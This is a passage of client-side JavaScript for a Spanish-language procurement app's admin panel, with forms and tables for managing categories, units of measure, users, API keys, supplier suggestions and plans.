        if (f.is_active) f.is_active.value = cat.is_active ? 'true' : 'false';
    } catch {}
}

async function handleCategory(e, editId) {
    e.preventDefault();
    const f = e.target;
    const data = {
        key: f.key.value.trim(),
        label: f.label.value.trim(),
        icon: f.icon.value.trim() || null,
        sort_order: parseInt(f.sort_order.value) || 0,
        description: f.description.value.trim() || null,
    };
    if (editId && f.is_active) {
        data.is_active = f.is_active.value === 'true';
    }

    try {
        const resp = editId
            ? await API.adminUpdateCategory(editId, data)
            : await API.adminCreateCategory(data);
        if (resp.ok) {
            closeModal();
            toast(editId ? 'Categoria actualizada' : 'Categoria creada', 'success');
            loadAdminCategories();
            loadCatalogData();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteCategory(id, name) {
    if (!confirm(`Eliminar la categoria "${name}"? Esta accion no se puede deshacer.`)) return;
    try {
        const resp = await API.adminDeleteCategory(id);
        if (resp.ok) {
            toast('Categoria eliminada', 'success');
            loadAdminCategories();
            loadCatalogData();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Admin: Units of Measure ───────────────────────────────────
async function renderAdminUoms() {
    if (!isAdmin()) { toast('Sin permisos', 'error'); return; }
    const c = document.getElementById('admin-content');
    c.innerHTML = `
        <div class="search-bar">
            <span style="font-size:14px;color:var(--gray-500)">Gestionar unidades de medida y sus aliases para el matching</span>
            <button class="btn btn-primary" onclick="showUomForm()">
                ${icon('plus',16)} Nueva Unidad
            </button>
        </div>
        <div id="admin-uoms-list"></div>
    `;
    loadAdminUoms();
}

async function loadAdminUoms() {
    try {
        const resp = await API.adminUoms();
        const container = document.getElementById('admin-uoms-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay unidades</p></div>';
            return;
        }
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Orden</th><th>Key</th><th>Nombre</th><th>Aliases</th><th>Activa</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(u => `
                    <tr>
                        <td>${u.sort_order}</td>
                        <td><code>${esc(u.key)}</code></td>
                        <td><strong>${esc(u.label)}</strong></td>
                        <td>${(u.aliases || []).map(a => `<span class="supplier-cat">${esc(a)}</span>`).join(' ') || '-'}</td>
                        <td>${u.is_active ? '<span style="color:var(--success)">Si</span>' : '<span style="color:var(--danger)">No</span>'}</td>
                        <td style="white-space:nowrap">
                            <button class="btn btn-sm btn-secondary" onclick="showUomForm(${u.id})" title="Editar">${icon('edit',14)}</button>
                            <button class="btn btn-sm btn-secondary" onclick="deleteUom(${u.id}, '${escJs(u.label)}')" title="Eliminar" style="color:var(--danger)">${icon('trash',14)}</button>
                        </td>
                    </tr>
                `).join('')}</tbody>
            </table></div>
            <p style="margin-top:8px;font-size:13px;color:var(--gray-500)">${resp.data.length} unidades de medida</p>
        `;
    } catch { document.getElementById('admin-uoms-list').innerHTML = '<div class="empty-state"><p>Error cargando</p></div>'; }
}

function showUomForm(editId) {
    const title = editId ? 'Editar Unidad de Medida' : 'Nueva Unidad de Medida';
    showModal(title, `
        <form id="admin-uom-form" onsubmit="handleUom(event, ${editId || 'null'})">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Key (abreviatura) *</label>
                    <input class="form-input" name="key" required placeholder="ej: m3, kg, pza">
                </div>
                <div class="form-group">
                    <label class="form-label">Nombre descriptivo *</label>
                    <input class="form-input" name="label" required placeholder="Metro cubico (m3)">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Aliases (separados por coma)</label>
                <input class="form-input" name="aliases" placeholder="metro cubico, metros cubicos, m&#179;">
                <small style="color:var(--gray-500)">Nombres alternativos que el sistema reconoce como esta unidad</small>
            </div>
            <div class="form-group">
                <label class="form-label">Orden</label>
                <input class="form-input" type="number" name="sort_order" value="0" min="0">
            </div>
            ${editId ? `
            <div class="form-group">
                <label class="form-label">Estado</label>
                <select class="form-select" name="is_active">
                    <option value="true">Activa</option>
                    <option value="false">Inactiva</option>
                </select>
            </div>` : ''}
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                ${editId ? 'Guardar Cambios' : 'Crear Unidad'}
            </button>
        </form>
    `);

    if (editId) loadUomIntoForm(editId);
}

async function loadUomIntoForm(id) {
    try {
        const resp = await API.adminUoms();
        if (!resp.ok) return;
        const uom = resp.data.find(u => u.id === id);
        if (!uom) return;
        const f = document.getElementById('admin-uom-form');
        if (!f) return;
        f.key.value = uom.key;
        f.label.value = uom.label;
        f.aliases.value = (uom.aliases || []).join(', ');
        f.sort_order.value = uom.sort_order;
        if (f.is_active) f.is_active.value = uom.is_active ? 'true' : 'false';
    } catch {}
}

async function handleUom(e, editId) {
    e.preventDefault();
    const f = e.target;
    const aliasStr = f.aliases.value.trim();
    const aliases = aliasStr ? aliasStr.split(',').map(a => a.trim()).filter(a => a) : null;

    const data = {
        key: f.key.value.trim(),
        label: f.label.value.trim(),
        aliases: aliases,
        sort_order: parseInt(f.sort_order.value) || 0,
    };
    if (editId && f.is_active) {
        data.is_active = f.is_active.value === 'true';
    }

    try {
        const resp = editId
            ? await API.adminUpdateUom(editId, data)
            : await API.adminCreateUom(data);
        if (resp.ok) {
            closeModal();
            toast(editId ? 'Unidad actualizada' : 'Unidad creada', 'success');
            loadAdminUoms();
            loadCatalogData();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteUom(id, name) {
    if (!confirm(`Eliminar la unidad "${name}"? Esta accion no se puede deshacer.`)) return;
    try {
        const resp = await API.adminDeleteUom(id);
        if (resp.ok) {
            toast('Unidad eliminada', 'success');
            loadAdminUoms();
            loadCatalogData();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Admin: Users ───────────────────────────────────────────────
async function renderAdminUsers() {
    if (!isManager()) { toast('Sin permisos', 'error'); return; }

    const c = document.getElementById('admin-content');
    c.innerHTML = `
        <div class="search-bar">
            <input class="form-input" id="admin-user-search" placeholder="Buscar por nombre o email..." oninput="debounceAdminUsers()">
            <select class="form-select" id="admin-user-role" onchange="loadAdminUsers()" style="max-width:180px">
                <option value="">Todos los roles</option>
                <option value="admin">Admin</option>
                <option value="manager">Gestor</option>
                <option value="field_agent">Agente de Campo</option>
                <option value="user">Usuario</option>
                <option value="supplier">Proveedor</option>
            </select>
            <button class="btn btn-primary" onclick="showAdminUserForm()">
                ${icon('user-plus',16)} Nuevo
            </button>
        </div>
        <div id="admin-users-list"></div>
    `;
    loadAdminUsers();
}

let _admUsrTimer;
function debounceAdminUsers() {
    clearTimeout(_admUsrTimer);
    _admUsrTimer = setTimeout(loadAdminUsers, 300);
}

async function loadAdminUsers() {
    const q = document.getElementById('admin-user-search')?.value?.trim() || '';
    const role = document.getElementById('admin-user-role')?.value || '';
    let params = '?limit=100';
    if (q) params += `&q=${encodeURIComponent(q)}`;
    if (role) params += `&role=${encodeURIComponent(role)}`;

    try {
        const resp = await API.adminUsers(params);
        const container = document.getElementById('admin-users-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay usuarios</p></div>';
            return;
        }
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Nombre</th><th>Email</th><th>Rol</th><th>Empresa</th><th>Activo</th><th>Ultimo acceso</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(u => `
                    <tr>
                        <td><strong>${esc(u.full_name)}</strong></td>
                        <td>${esc(u.email)}</td>
                        <td><span class="badge badge-${ROLE_COLORS[u.role] || 'gray'}">${esc(ROLE_LABELS[u.role] || u.role)}</span></td>
                        <td>${u.company_name ? esc(u.company_name) : '-'}</td>
                        <td>${u.is_active ? '<span style="color:var(--success)">Si</span>' : '<span style="color:var(--danger)">No</span>'}</td>
                        <td>${u.last_login ? new Date(u.last_login).toLocaleDateString('es') : 'Nunca'}</td>
                        <td style="white-space:nowrap">
                            <button class="btn btn-sm btn-secondary" onclick="showEditUserModal(${u.id}, '${escJs(u.full_name)}', '${escJs(u.role)}', ${u.is_active}, '${escJs(u.telegram_user_id || '')}')" title="Editar">${icon('edit',14)}</button>
                            ${isAdmin() ? `<button class="btn btn-sm btn-secondary" onclick="resetUserPassword(${u.id}, '${escJs(u.full_name)}')" title="Resetear contrasena">${icon('key',14)}</button>` : ''}
                        </td>
                    </tr>
                `).join('')}</tbody>
            </table></div>
            <p style="margin-top:8px;font-size:13px;color:var(--gray-500)">${resp.total} usuarios</p>
        `;
    } catch { document.getElementById('admin-users-list').innerHTML = '<div class="empty-state"><p>Error cargando</p></div>'; }
}

function showAdminUserForm() {
    const roleOptions = isAdmin()
        ? `<option value="field_agent" selected>Agente de Campo</option>
           <option value="manager">Gestor</option>
           <option value="admin">Administrador</option>
           <option value="user">Usuario</option>`
        : `<option value="field_agent" selected>Agente de Campo</option>
           <option value="user">Usuario</option>`;

    showModal('Crear Usuario', `
        <form id="admin-user-form" onsubmit="handleCreateUser(event)">
            <div class="form-group">
                <label class="form-label">Nombre completo *</label>
                <input class="form-input" name="full_name" required placeholder="Juan Perez">
            </div>
            <div class="form-group">
                <label class="form-label">Email *</label>
                <input class="form-input" type="email" name="email" required placeholder="juan@empresa.com">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Telefono</label><input class="form-input" name="phone" placeholder="77889900"></div>
                <div class="form-group"><label class="form-label">Empresa</label><input class="form-input" name="company_name" placeholder="SSA Ingenieria"></div>
            </div>
            <div class="form-group">
                <label class="form-label">Rol *</label>
                <select class="form-select" name="role">${roleOptions}</select>
            </div>
            <div class="form-group">
                <label class="form-label">Contrasena temporal *</label>
                <input class="form-input" name="password" required minlength="6" placeholder="Min. 6 caracteres" value="${generateTempPassword()}">
                <small style="color:var(--gray-500)">El usuario debera cambiarla al ingresar</small>
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                Crear Usuario
            </button>
        </form>
    `);
}

function generateTempPassword() {
    const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
    let pwd = '';
    for (let i = 0; i < 8; i++) pwd += chars[Math.floor(Math.random() * chars.length)];
    return pwd;
}

async function handleCreateUser(e) {
    e.preventDefault();
    const f = e.target;
    const data = {
        email: f.email.value,
        password: f.password.value,
        full_name: f.full_name.value,
        role: f.role.value,
        phone: f.phone.value || null,
        company_name: f.company_name.value || null,
    };
    try {
        const resp = await API.adminCreateUser(data);
        if (resp.ok) {
            closeModal();
            toast(`Usuario ${data.full_name} creado como ${ROLE_LABELS[data.role]}. Contrasena: ${data.password}`, 'success');
            loadAdminUsers();
        } else {
            toast(resp.detail || 'Error al crear usuario', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

function showEditUserModal(userId, name, currentRole, isActive, telegramUserId) {
    const roleOptions = isAdmin()
        ? ['admin','manager','field_agent','user','supplier'].map(r =>
            `<option value="${r}"${r === currentRole ? ' selected' : ''}>${ROLE_LABELS[r]}</option>`).join('')
        : `<option value="${currentRole}" selected>${ROLE_LABELS[currentRole] || currentRole}</option>`;

    showModal(`Editar: ${name}`, `
        <form onsubmit="handleUpdateUser(event, ${userId})">
            <div class="form-group">
                <label class="form-label">Rol</label>
                <select class="form-select" name="role">${roleOptions}</select>
            </div>
            <div class="form-group">
                <label class="form-label">Telegram user ID <small style="font-weight:400;color:var(--gray-400)">(para cotizadores)</small></label>
                <input class="form-input" name="telegram_user_id" value="${esc(telegramUserId || '')}" placeholder="Ej: 123456789">
                <small style="color:var(--gray-500)">Habilita al usuario a tomar pedidos desde el grupo TG. Lo obtienen hablando a @userinfobot.</small>
            </div>
            <div class="form-group">
                <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
                    <input type="checkbox" name="is_active" ${isActive ? 'checked' : ''}>
                    <span class="form-label" style="margin:0">Cuenta activa</span>
                </label>
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center">Guardar</button>
        </form>
    `);
}

async function handleUpdateUser(e, userId) {
    e.preventDefault();
    const f = e.target;
    try {
        const resp = await API.adminUpdateUser(userId, {
            role: f.role.value,
            is_active: f.is_active.checked,
            telegram_user_id: f.telegram_user_id.value.trim() || null,
        });
        if (resp.ok) { closeModal(); toast('Usuario actualizado', 'success'); loadAdminUsers(); }
        else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

async function resetUserPassword(userId, name) {
    if (!confirm(`Resetear contrasena de ${name}?`)) return;
    try {
        const resp = await API.adminResetPassword(userId);
        if (resp.ok) {
            toast(`Nueva contrasena temporal para ${name}: ${resp.temp_password}`, 'success');
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Admin: API Keys ────────────────────────────────────────────
async function renderAdminApiKeys() {
    if (!isAdmin()) { toast('Sin permisos', 'error'); return; }

    const c = document.getElementById('admin-content');
    c.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
            <div>
                <p style="font-size:13px;color:var(--gray-500)">
                    Las API keys permiten a integraciones externas (n8n, MCP, Zapier) acceder a los datos.
                    <br>Endpoint base: <code>/api/v1/integration/</code> con header <code>X-API-Key</code>
                </p>
            </div>
            <button class="btn btn-primary" onclick="showCreateApiKeyModal()">
                ${icon('plus',16)} Nueva API Key
            </button>
        </div>
        <div id="admin-apikeys-list"><div class="empty-state"><p>Cargando...</p></div></div>
    `;
    loadAdminApiKeys();
}

async function loadAdminApiKeys() {
    try {
        const resp = await API.apiKeys();
        const container = document.getElementById('admin-apikeys-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay API keys creadas</p></div>';
            return;
        }
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Nombre</th><th>Key</th><th>Permisos</th><th>Estado</th>
                    <th>Expiracion</th><th>Ultimo uso</th><th>Usos</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(k => {
                    const isExpired = k.expires_at && new Date(k.expires_at) < new Date();
                    const statusBadge = !k.is_active
                        ? '<span class="badge badge-danger">Revocada</span>'
                        : isExpired
                            ? '<span class="badge badge-warning">Expirada</span>'
                            : '<span class="badge badge-success">Activa</span>';
                    const scopeBadges = (k.scopes || '').split(',').map(s =>
                        `<span class="badge badge-gray">${esc(s.trim())}</span>`).join(' ');
                    return `
                    <tr style="${!k.is_active ? 'opacity:0.5' : ''}">
                        <td><strong>${esc(k.name)}</strong>${k.description ? `<br><small style="color:var(--gray-500)">${esc(k.description)}</small>` : ''}</td>
                        <td><code>${esc(k.key_prefix)}...</code></td>
                        <td>${scopeBadges}</td>
                        <td>${statusBadge}</td>
                        <td>${k.expires_at ? new Date(k.expires_at).toLocaleDateString('es') : 'Sin expiracion'}</td>
                        <td>${k.last_used_at ? new Date(k.last_used_at).toLocaleDateString('es') : 'Nunca'}</td>
                        <td>${k.usage_count}</td>
                        <td style="white-space:nowrap">
                            <button class="btn btn-sm btn-secondary" onclick="showEditApiKeyModal(${k.id}, '${escJs(k.name)}', '${escJs(k.scopes)}', ${k.is_active})">${icon('edit',14)}</button>
                            ${k.is_active ? `<button class="btn btn-sm btn-secondary" style="color:var(--danger)" onclick="revokeApiKey(${k.id}, '${escJs(k.name)}')" title="Revocar">${icon('trash',14)}</button>` : ''}
                        </td>
                    </tr>`;
                }).join('')}</tbody>
            </table></div>
        `;
    } catch { document.getElementById('admin-apikeys-list').innerHTML = '<div class="empty-state"><p>Error cargando</p></div>'; }
}

function showCreateApiKeyModal() {
    showModal('Crear API Key', `
        <form id="create-apikey-form" onsubmit="handleCreateApiKey(event)">
            <div class="form-group">
                <label class="form-label">Nombre *</label>
                <input class="form-input" name="name" required placeholder="Ej: n8n Produccion, MCP Claude, Zapier">
            </div>
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <input class="form-input" name="description" placeholder="Para que se usa esta key">
            </div>
            <div class="form-group">
                <label class="form-label">Permisos</label>
                <div style="display:flex;gap:12px;margin-top:4px">
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px"><input type="checkbox" name="scope_read" checked> Leer</label>
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px"><input type="checkbox" name="scope_write" checked> Escribir</label>
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px"><input type="checkbox" name="scope_delete"> Eliminar</label>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Expiracion</label>
                <select class="form-select" name="expires_in_days">
                    <option value="">Sin expiracion</option>
                    <option value="7">7 dias</option>
                    <option value="30">30 dias</option>
                    <option value="90" selected>90 dias</option>
                    <option value="180">6 meses</option>
                    <option value="365">1 ano</option>
                </select>
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                Generar API Key
            </button>
        </form>
    `);
}

async function handleCreateApiKey(e) {
    e.preventDefault();
    const f = e.target;
    const scopes = [];
    if (f.scope_read.checked) scopes.push('read');
    if (f.scope_write.checked) scopes.push('write');
    if (f.scope_delete.checked) scopes.push('delete');

    const data = {
        name: f.name.value,
        description: f.description.value || null,
        scopes: scopes.join(',') || 'read',
        expires_in_days: f.expires_in_days.value ? parseInt(f.expires_in_days.value) : null,
    };

    try {
        const resp = await API.createApiKey(data);
        if (resp.ok) {
            closeModal();
            // Show the raw key in a special modal — only shown once!
            showModal('API Key Creada', `
                <div style="text-align:center;padding:8px 0">
                    <p style="color:var(--danger);font-weight:600;margin-bottom:12px">
                        Copia esta key ahora. No se puede recuperar despues.
                    </p>
                    <div style="background:var(--gray-100);padding:16px;border-radius:var(--radius);margin-bottom:16px;word-break:break-all">
                        <code id="raw-key-display" style="font-size:15px;user-select:all">${esc(resp.data.raw_key)}</code>
                    </div>
                    <button class="btn btn-primary" onclick="copyApiKey('${escJs(resp.data.raw_key)}')" style="margin-bottom:8px">
                        Copiar al portapapeles
                    </button>
                    <p style="font-size:12px;color:var(--gray-500);margin-top:8px">
                        Usa esta key en el header <code>X-API-Key</code> de tus peticiones HTTP.
                    </p>
                </div>
            `);
            loadAdminApiKeys();
        } else {
            toast(resp.detail || 'Error al crear key', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

function copyApiKey(key) {
    navigator.clipboard.writeText(key).then(() => {
        toast('API Key copiada al portapapeles', 'success');
    }).catch(() => {
        // Fallback: select the text
        const el = document.getElementById('raw-key-display');
        if (el) {
            const range = document.createRange();
            range.selectNodeContents(el);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            toast('Selecciona y copia manualmente (Ctrl+C)', 'info');
        }
    });
}

function showEditApiKeyModal(keyId, name, scopes, isActive) {
    const scopeList = scopes.split(',').map(s => s.trim());
    showModal(`Editar: ${name}`, `
        <form onsubmit="handleUpdateApiKey(event, ${keyId})">
            <div class="form-group">
                <label class="form-label">Nombre</label>
                <input class="form-input" name="name" value="${esc(name)}">
            </div>
            <div class="form-group">
                <label class="form-label">Permisos</label>
                <div style="display:flex;gap:12px;margin-top:4px">
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px"><input type="checkbox" name="scope_read" ${scopeList.includes('read') ? 'checked' : ''}> Leer</label>
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px"><input type="checkbox" name="scope_write" ${scopeList.includes('write') ? 'checked' : ''}> Escribir</label>
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px"><input type="checkbox" name="scope_delete" ${scopeList.includes('delete') ? 'checked' : ''}> Eliminar</label>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Renovar expiracion</label>
                <select class="form-select" name="expires_in_days">
                    <option value="">No cambiar</option>
                    <option value="7">7 dias desde hoy</option>
                    <option value="30">30 dias desde hoy</option>
                    <option value="90">90 dias desde hoy</option>
                    <option value="365">1 ano desde hoy</option>
                </select>
            </div>
            <div class="form-group">
                <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
                    <input type="checkbox" name="is_active" ${isActive ? 'checked' : ''}>
                    <span class="form-label" style="margin:0">Key activa</span>
                </label>
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center">Guardar</button>
        </form>
    `);
}

async function handleUpdateApiKey(e, keyId) {
    e.preventDefault();
    const f = e.target;
    const scopes = [];
    if (f.scope_read.checked) scopes.push('read');
    if (f.scope_write.checked) scopes.push('write');
    if (f.scope_delete.checked) scopes.push('delete');

    const data = {
        name: f.name.value || undefined,
        scopes: scopes.join(',') || 'read',
        is_active: f.is_active.checked,
    };
    if (f.expires_in_days.value) data.expires_in_days = parseInt(f.expires_in_days.value);

    try {
        const resp = await API.updateApiKey(keyId, data);
        if (resp.ok) { closeModal(); toast('API Key actualizada', 'success'); loadAdminApiKeys(); }
        else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

async function revokeApiKey(keyId, name) {
    if (!confirm(`Revocar API key "${name}"? Las integraciones que la usen dejaran de funcionar.`)) return;
    try {
        const resp = await API.revokeApiKey(keyId);
        if (resp.ok) { toast('API Key revocada', 'success'); loadAdminApiKeys(); }
        else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

// ── Suggest supplier modal ───────────────────────────────────
function showSuggestSupplierModal() {
    showModal('Sugerir Proveedor', `
        <p style="font-size:13px;color:var(--gray-500);margin-bottom:16px">Conoces un proveedor que no esta en nuestro directorio? Sugierelo y lo revisaremos.</p>
        <form onsubmit="handleSuggestSupplier(event)">
            <div class="form-group">
                <label class="form-label">Nombre del proveedor *</label>
                <input class="form-input" name="name" required placeholder="Ferreteria Central">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Nombre comercial</label>
                    <input class="form-input" name="trade_name" placeholder="FERCENAL">
                </div>
                <div class="form-group">
                    <label class="form-label">NIT</label>
                    <input class="form-input" name="nit" placeholder="1234567">
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Telefono</label>
                    <input class="form-input" name="phone" placeholder="+591 ...">
                </div>
                <div class="form-group">
                    <label class="form-label">WhatsApp</label>
                    <input class="form-input" name="whatsapp" placeholder="+591 ...">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Email</label>
                <input class="form-input" name="email" type="email" placeholder="ventas@proveedor.com">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Ciudad</label>
                    <input class="form-input" name="city" placeholder="Santa Cruz">
                </div>
                <div class="form-group">
                    <label class="form-label">Departamento</label>
                    <select class="form-input" name="department">
                        <option value="">Seleccionar...</option>
                        ${DEPARTMENTS.map(d => `<option value="${d}">${d}</option>`).join('')}
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Categorias que maneja</label>
                <div class="sugg-categories" style="display:flex;flex-wrap:wrap;gap:6px">
                    ${Object.entries(CATEGORY_META).map(([k, v]) =>
                        `<label style="font-size:12px;display:flex;align-items:center;gap:3px"><input type="checkbox" name="cat_${k}" value="${k}"> ${esc(v.label || k)}</label>`
                    ).join('')}
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Notas / Como lo conoces</label>
                <textarea class="form-input" name="notes" rows="2" placeholder="Observaciones adicionales..."></textarea>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Enviar Sugerencia</button>
            </div>
        </form>
    `);
}

async function handleSuggestSupplier(e) {
    e.preventDefault();
    const f = e.target;
    const categories = [];
    Object.keys(CATEGORY_META).forEach(k => {
        if (f[`cat_${k}`]?.checked) categories.push(k);
    });

    const resp = await API.suggestSupplier({
        name: f.name.value,
        trade_name: f.trade_name.value || null,
        nit: f.nit.value || null,
        phone: f.phone.value || null,
        whatsapp: f.whatsapp.value || null,
        email: f.email.value || null,
        city: f.city.value || null,
        department: f.department.value || null,
        categories: categories.length ? categories : null,
        notes: f.notes.value || null,
    });
    if (resp.ok) {
        closeModal();
        toast('Sugerencia enviada. Sera revisada por el equipo.', 'success');
    } else toast(resp.detail || 'Error', 'error');
}

// ── Admin: Supplier Suggestions ──────────────────────────────
async function renderAdminSuggestions() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="empty-state"><p>Cargando sugerencias...</p></div>';

    try {
        const resp = await API.adminSuggestions();
        if (!resp.ok) { c.innerHTML = '<p>Error cargando datos</p>'; return; }
        if (!resp.data.length) {
            c.innerHTML = '<div class="empty-state"><p>No hay sugerencias de proveedores</p></div>';
            return;
        }

        const stateColors = { pending: '#d97706', approved: '#16a34a', rejected: '#dc2626', duplicate: '#6b7280' };
        const stateLabels = { pending: 'Pendiente', approved: 'Aprobado', rejected: 'Rechazado', duplicate: 'Duplicado' };

        c.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
                <p style="font-size:13px;color:var(--gray-500)">${resp.total} sugerencias</p>
                <div style="display:flex;gap:6px">
                    <button class="chip active" onclick="loadAdminSuggestions(null,this)">Todos</button>
                    <button class="chip" onclick="loadAdminSuggestions('pending',this)">Pendientes</button>
                    <button class="chip" onclick="loadAdminSuggestions('approved',this)">Aprobados</button>
                </div>
            </div>
            <div id="sugg-list-content">
                ${renderSuggestionCards(resp.data, stateColors, stateLabels)}
            </div>
        `;
    } catch { c.innerHTML = '<p>Error de conexion</p>'; }
}

async function loadAdminSuggestions(stateFilter, chipEl) {
    if (chipEl) {
        chipEl.closest('.admin-content, #admin-content').querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
        chipEl.classList.add('active');
    }
    const params = stateFilter ? `?state=${stateFilter}` : '';
    const container = document.getElementById('sugg-list-content');
    if (!container) return;
    try {
        const resp = await API.adminSuggestions(params);
        if (!resp.ok) return;
        const stateColors = { pending: '#d97706', approved: '#16a34a', rejected: '#dc2626', duplicate: '#6b7280' };
        const stateLabels = { pending: 'Pendiente', approved: 'Aprobado', rejected: 'Rechazado', duplicate: 'Duplicado' };
        container.innerHTML = resp.data.length
            ? renderSuggestionCards(resp.data, stateColors, stateLabels)
            : '<div class="empty-state"><p>Sin resultados</p></div>';
    } catch {}
}

function renderSuggestionCards(data, stateColors, stateLabels) {
    return `<div class="pedido-grid">${data.map(s => `
        <div class="pedido-card" style="cursor:default">
            <div class="pedido-card-header">
                <span class="pedido-ref">#${s.id}</span>
                <span class="pedido-state" style="background:${stateColors[s.state]}">${stateLabels[s.state] || s.state}</span>
            </div>
            <div class="pedido-card-title">${esc(s.name)}</div>
            <div class="pedido-card-meta">
                ${s.trade_name ? esc(s.trade_name) + ' &middot; ' : ''}${s.city ? esc(s.city) : ''}${s.department ? ', ' + esc(s.department) : ''}
                ${s.phone ? ' &middot; ' + esc(s.phone) : ''}${s.whatsapp ? ' &middot; WA: ' + esc(s.whatsapp) : ''}
            </div>
            ${s.categories?.length ? `<div style="margin:6px 0">${s.categories.map(c => `<span class="supplier-cat">${esc(c)}</span>`).join(' ')}</div>` : ''}
            ${s.notes ? `<div style="font-size:12px;color:var(--gray-500);margin:4px 0">${esc(s.notes)}</div>` : ''}
            <div class="pedido-card-footer">
                <span>Por: ${esc(s.suggester_name || '?')} &middot; ${new Date(s.created_at).toLocaleDateString()}</span>
            </div>
            ${s.state === 'pending' ? `
                <div style="display:flex;gap:6px;margin-top:10px">
                    <button class="btn btn-sm btn-primary" onclick="approveSuggestion(${s.id})">Aprobar</button>
                    <button class="btn btn-sm btn-danger" onclick="rejectSuggestion(${s.id})">Rechazar</button>
                </div>
            ` : ''}
            ${s.state === 'approved' && s.created_supplier_id ? `<div style="font-size:12px;margin-top:6px;color:#16a34a">Proveedor #${s.created_supplier_id} creado</div>` : ''}
            ${s.review_notes ? `<div style="font-size:12px;margin-top:4px;color:var(--gray-500)">Nota: ${esc(s.review_notes)}</div>` : ''}
        </div>
    `).join('')}</div>`;
}

async function approveSuggestion(id) {
    if (!confirm('Aprobar esta sugerencia? Se creara un nuevo proveedor.')) return;
    const resp = await API.approveSuggestion(id);
    if (resp.ok) {
        toast(`Proveedor #${resp.data.supplier_id} creado`, 'success');
        renderAdminSuggestions();
    } else toast(resp.detail || 'Error', 'error');
}

async function rejectSuggestion(id) {
    const reason = prompt('Motivo del rechazo (opcional):') || '';
    const resp = await API.rejectSuggestion(id, reason);
    if (resp.ok) {
        toast('Sugerencia rechazada', 'success');
        renderAdminSuggestions();
    } else toast(resp.detail || 'Error', 'error');
}

// ── Admin: Plans ─────────────────────────────────────────────
async function renderAdminPlans() {
    if (!isAdmin()) { toast('Sin permisos', 'error'); return; }
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="empty-state"><p>Cargando planes...</p></div>';

    try {
        const resp = await API.adminPlans();
        if (!resp.ok) { c.innerHTML = '<p>Error cargando datos</p>'; return; }

        c.innerHTML = `
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
                <p style="font-size:13px;color:var(--gray-500)">${resp.data.length} planes configurados</p>
                <button class="btn btn-primary btn-sm" onclick="showPlanFormModal()">+ Nuevo Plan</button>
            </div>
            <div class="plans-admin-grid">
                ${resp.data.map(p => `
                    <div class="plan-card ${!p.is_active ? 'plan-inactive' : ''}">
                        <div class="plan-name">${esc(p.label)} <span style="font-size:11px;color:var(--gray-400)">(${esc(p.key)})</span></div>
